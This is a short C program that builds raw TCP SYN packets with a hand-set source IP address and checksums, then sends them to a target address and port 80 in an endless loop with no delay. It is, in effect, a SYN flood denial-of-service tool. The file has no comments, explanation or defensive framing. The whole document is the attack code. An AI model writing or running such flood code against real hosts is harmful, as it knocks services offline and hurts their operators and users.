#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>

struct pseudo_header
{
	u_int32_t source_address;
	u_int32_t dest_address;
	u_int8_t placeholder;
	u_int8_t protocol;
	u_int16_t tcp_length;
};

unsigned short csum(unsigned short *ptr, int nbytes)
{
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum = 0;
	while (nbytes > 1)
	{
		sum += *ptr++;
		nbytes -= 2;
	}
	if (nbytes == 1)
	{
		oddbyte = 0;
		*((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
		sum += oddbyte;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum = sum + (sum >> 16);
	answer = (short)~sum;

	return (answer);
}

int main(void)
{
	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);

	if (s == -1)
	{
		perror("Failed to create socket");
		exit(1);
	}

	char datagram[4096], source_ip[32], *data, *pseudogram;
	memset(datagram, 0, 4096);
	struct iphdr *iph = (struct iphdr *)datagram;
	struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct ip));
	struct sockaddr_in sin;
	struct pseudo_header psh;

	data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
	strcpy(data, "ABCDEFGHIJKLMNOPQRSTUVWXYZ");

	strcpy(source_ip, "192.168.0.104");
	sin.sin_family = AF_INET;
	sin.sin_port = htons(80);
	sin.sin_addr.s_addr = inet_addr("1.2.3.4");

	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data);
	iph->id = htonl(54321);
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0;
	iph->saddr = inet_addr(source_ip);
	iph->daddr = sin.sin_addr.s_addr;

	iph->check = csum((unsigned short *)datagram, iph->tot_len);

	tcph->source = htons(1234);
	tcph->dest = htons(80);
	tcph->seq = 0;
	tcph->ack_seq = 0;
	tcph->doff = 5;
	tcph->fin = 0;
	tcph->syn = 1;
	tcph->rst = 0;
	tcph->psh = 0;
	tcph->ack = 0;
	tcph->urg = 0;
	tcph->window = htons(5840);
	tcph->check = 0;
	tcph->urg_ptr = 0;

	psh.source_address = inet_addr(source_ip);
	psh.dest_address = sin.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data));

	int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
	pseudogram = malloc(psize);

	memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
	memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + strlen(data));

	tcph->check = csum((unsigned short *)pseudogram, psize);

	int one = 1;
	const int *val = &one;

	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
	{
		perror("Error setting IP_HDRINCL");
		exit(0);
	}

	printf("\nSOURCE IP: %s", source_ip);
	printf("\nPacket Sent. Length : %d \n", iph->tot_len);
	while (1)
	{
		if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
		{
			perror("sendto failed");
		}
		else
			continue;
	}

	return 0;
}